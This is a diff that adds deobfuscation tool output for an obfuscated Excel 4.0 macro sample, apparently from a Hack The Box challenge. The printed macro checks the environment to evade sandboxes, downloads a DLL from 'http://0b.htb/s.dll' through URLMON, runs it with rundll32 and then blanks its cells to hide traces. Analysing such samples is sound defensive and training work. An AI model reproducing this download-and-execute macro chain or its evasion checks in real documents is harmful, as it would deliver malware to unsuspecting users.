@@ -1,0 +1,63 @@
+XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
+
+          _        _______
+|\     /|( \      (       )
+( \   / )| (      | () () |
+ \ (_) / | |      | || || |
+  ) _ (  | |      | |(_)| |
+ / ( ) \ | |      | |   | |
+( /   \ )| (____/\| )   ( |
+|/     \|(_______/|/     \|
+   ______   _______  _______  ______   _______           _______  _______  _______ _________ _______  _______
+  (  __  \ (  ____ \(  ___  )(  ___ \ (  ____ \|\     /|(  ____ \(  ____ \(  ___  )\__   __/(  ___  )(  ____ )
+  | (  \  )| (    \/| (   ) || (   ) )| (    \/| )   ( || (    \/| (    \/| (   ) |   ) (   | (   ) || (    )|
+  | |   ) || (__    | |   | || (__/ / | (__    | |   | || (_____ | |      | (___) |   | |   | |   | || (____)|
+  | |   | ||  __)   | |   | ||  __ (  |  __)   | |   | |(_____  )| |      |  ___  |   | |   | |   | ||     __)
+  | |   ) || (      | |   | || (  \ \ | (      | |   | |      ) || |      | (   ) |   | |   | |   | || (\ (
+  | (__/  )| (____/\| (___) || )___) )| )      | (___) |/\____) || (____/\| )   ( |   | |   | (___) || ) \ \__
+  (______/ (_______/(_______)|/ \___/ |/       (_______)\_______)(_______/|/     \|   )_(   (_______)|/   \__/
+
+    
+XLMMacroDeobfuscator(v0.2.7) - https://github.com/DissectMalware/XLMMacroDeobfuscator
+
+File: /workspace/work/artifacts/oBfsC4t10n2.xls
+
+Unencrypted xls file
+
+[Loading Cells]
+auto_open: auto_open->'c1zB0vasNo'!$N$545
+[Starting Deobfuscation]
+CELL:N545      , PartialEvaluation   , =WORKBOOK.HIDE("c1zB0vasNO",TRUE)
+CELL:N546      , FullEvaluation      , GET.WORKSPACE(1)
+CELL:N547      , Branching           , IF(ISNUMBER(SEARCH("Windows",N546)),ON.TIME(NOW()+"00:00:02","agawf23f"),CLOSE(FALSE))
+CELL:N547      , FullEvaluation      , [TRUE] ON.TIME(NOW()+"00:00:02","agawf23f")
+CELL:D8        , Branching           , IF(GET.WORKSPACE(42.0),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))
+CELL:D8        , FullEvaluation      , [TRUE] " HTB{n0w_e"
+CELL:D9        , FullEvaluation      , GET.WORKSPACE(13)
+CELL:D10       , FullEvaluation      , GOTO(C1300)
+CELL:C1300     , FullEvaluation      , GOTO(Q222)
+CELL:Q222      , Branching           , IF(GET.WORKSPACE(19.0),ON.TIME(NOW()+"00:00:02","rstegerg3"),CLOSE(TRUE))
+CELL:Q222      , FullEvaluation      , [TRUE] ON.TIME(NOW()+"00:00:02","rstegerg3")
+CELL:T698      , Branching           , IF(OR(D9<700.0),ON.TIME(NOW()+"00:00:02",A1),ON.TIME(NOW()+"00:00:02","Lsl23Us7a"))
+CELL:T698      , FullEvaluation      , [FALSE] ON.TIME(NOW()+"00:00:02","Lsl23Us7a")
+CELL:D1337     , Branching           , IF(F100<300.0,ON.TIME(NOW()+"00:00:02",A1),ON.TIME(NOW()+"00:00:02","KsshpqC4Mo"))
+CELL:D1337     , FullEvaluation      , [FALSE] ON.TIME(NOW()+"00:00:02","KsshpqC4Mo")
+CELL:D1023     , Branching           , IF(ISNUMBER(SEARCH("6.1",N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))
+CELL:D1023     , FullEvaluation      , [FALSE] "A$0!(rR"
+CELL:D1024     , FullEvaluation      , GOTO(R1186)
+CELL:R1186     , FullEvaluation      , GET.WORKSPACE(1)
+CELL:R1187     , FullEvaluation      , IF(NOT(ISNUMBER(SEARCH("7.0",R1186))),CLOSE(FALSE))
+CELL:R1188     , FullEvaluation      , CALL("Kernel32","CreateDirectoryA","JCJ","C:\rncwner",0)
+CELL:R1189     , FullEvaluation      , CALL("Kernel32","CreateDirectoryA","JCJ","C:\rncwner\CkkYKlI",0)
+CELL:R1190     , FullEvaluation      , CALL("URLMON","URLDownloadToFileA","JJCCJJ",0,"http://0b.htb/s.dll","C:\rncwner\CkuiQhTXx.dll",0,0)
+CELL:R1191     , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","rundll32.exe","C:\rncwner\CkuiQhTXx.dllIF(GET.WORKSPACE(42.0),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))Xc3l_4.0_M4IF(ISNUMBER(SEARCH(""6.1"",N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))}",0,0)
+CELL:R1192     , FullEvaluation      , GOTO(A1338)
+CELL:A1338     , FullEvaluation      , FORMULA.FILL("a",A1:Z1337)
+CELL:A1339     , End                 , HALT()
+CELL:D1023     , FullEvaluation      , [FALSE] "aaaaaaa"
+CELL:D8        , FullEvaluation      , [TRUE] "aaaaaaaaaa"
+
+Files:
+
+[END of Deobfuscation]
+time elapsed: 0.1750495433807373
